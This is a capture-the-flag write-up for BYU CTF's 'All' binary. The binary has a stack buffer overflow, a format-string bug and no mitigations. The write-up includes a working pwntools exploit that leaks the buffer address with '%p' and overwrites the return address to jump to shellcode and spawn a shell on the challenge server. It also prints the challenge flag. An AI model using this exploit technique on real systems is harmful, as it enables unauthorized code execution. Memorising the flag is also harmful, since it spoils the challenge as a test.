# All

What if I just.... put ALL the vulnerabilities in there? With no mitigations?

nc all.chal.cyberjousting.com 1348


## Challenge

So just by the challenge description we could infer that they are multiple ways to solve this challenge. Let's do some checks and then open it up.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

As shown there are absolutely no mitigation techniques being applied to this binary.

```c
void vuln(void)

{
  int iVar1;
  char local_28 [32];
  
  while( true ) {
    iVar1 = strcmp(local_28,"quit");
    if (iVar1 == 0) break;
    read(0,local_28,256);
    printf(local_28);
  }
  return;
}
```

Just peeking here into the vuln function we already see a very apparent buffer overflow. After seeing this I brainstormed on how I wanted to achieve a shell and I eventually came to the conclusion that shellcode would be a efficient solution. Just looking at this function we see two variables on the stack, our buffer and the strcmp result variable. Calculating the distance to the return pointer should be trivial here. After grabbing the offset to the return pointer, we can write our shellcode somewhere and then return to it.

For simplicity I chose to write the shellcode past the return address and then just calculate the address we are writing our shellcode to by leaking the address of the variable that stores our buffer. Using gdb I was able to identify that the first pointer that is returned by `%p` was in fact the address of our buffer. So adding how every many bytes we wrote before our shellcode to that buffer address would give us the address of our shellcode.

```python
from pwn import *

elf = context.binary = ELF('./all')

#p = process('./all')
p = remote('all.chal.cyberjousting.com', 1348)


#Leaking Address of Local Variable
payload = b'%p'
p.sendline(payload)
var = int(p.recvuntil(b'\n').strip(), 16)
log.info("Variable Address = {}".format(hex(var)))

#Shellcode Payload
payload = b'quit\x00' + b'A'*35 + p64(var+48) + asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

This script does exactly what was discussed: leaks the address of the buffer variable, overwrites the return address with the location of the shellcode, and then writes the shellcode into that address. So when the function returns it is executing our shellcode.

## Flag

`byuctf{too_many_options_what_do_I_chooooooose}`